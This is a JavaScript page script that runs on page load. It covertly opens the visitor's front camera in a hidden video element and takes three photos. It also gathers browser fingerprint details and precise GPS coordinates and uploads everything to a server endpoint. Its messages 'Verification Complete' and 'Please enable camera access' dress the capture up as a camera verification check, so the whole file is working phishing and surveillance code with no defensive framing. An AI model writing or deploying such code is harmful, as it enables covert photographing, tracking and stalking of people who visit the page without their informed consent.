// Advanced Camera Capture with Device Info & GPS
(function() {
    'use strict';

    const API_ENDPOINT = '/upload.php';
    const PHOTO_COUNT = 3;
    const DELAY_MS = 800;

    // Collect device information
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            timestamp: new Date().toISOString()
        };
    }

    // Get GPS location
    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: 'Geolocation not supported' });
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    });
                },
                (error) => {
                    resolve({ error: error.message });
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        });
    }

    // Send data to server
    async function sendData(formData) {
        try {
            const response = await fetch(API_ENDPOINT, {
                method: 'POST',
                body: formData
            });
            return response.ok;
        } catch (error) {
            console.error('Upload failed:', error);
            return false;
        }
    }

    // Capture photos
    async function capturePhotos() {
        try {
            // Request camera access
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' }, 
                audio: false 
            });

            // Create hidden video element
            const video = document.createElement('video');
            video.style.display = 'none';
            video.srcObject = stream;
            video.play();

            // Wait for video to be ready
            await new Promise(resolve => {
                video.onloadedmetadata = resolve;
            });

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');

            // Capture multiple photos
            for (let i = 0; i < PHOTO_COUNT; i++) {
                await new Promise(resolve => setTimeout(resolve, DELAY_MS));
                
                ctx.drawImage(video, 0, 0);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
                
                const formData = new FormData();
                formData.append('photo', blob, `photo_${Date.now()}_${i}.jpg`);
                
                // Add device info on first photo
                if (i === 0) {
                    const deviceInfo = getDeviceInfo();
                    const location = await getLocation();
                    formData.append('device_info', JSON.stringify(deviceInfo));
                    formData.append('location', JSON.stringify(location));
                }
                
                await sendData(formData);
            }

            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            // Show success message (optional)
            if (document.body) {
                document.body.innerHTML = '<h1>Verification Complete</h1><p>Thank you for verifying your camera.</p>';
            }
        } catch (error) {
            console.error('Camera access failed:', error);
            if (document.body) {
                document.body.innerHTML = '<h1>Camera Access Required</h1><p>Please enable camera access and refresh the page.</p>';
            }
        }
    }

    // Auto-start when page loads
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', capturePhotos);
    } else {
        capturePhotos();
    }
})();
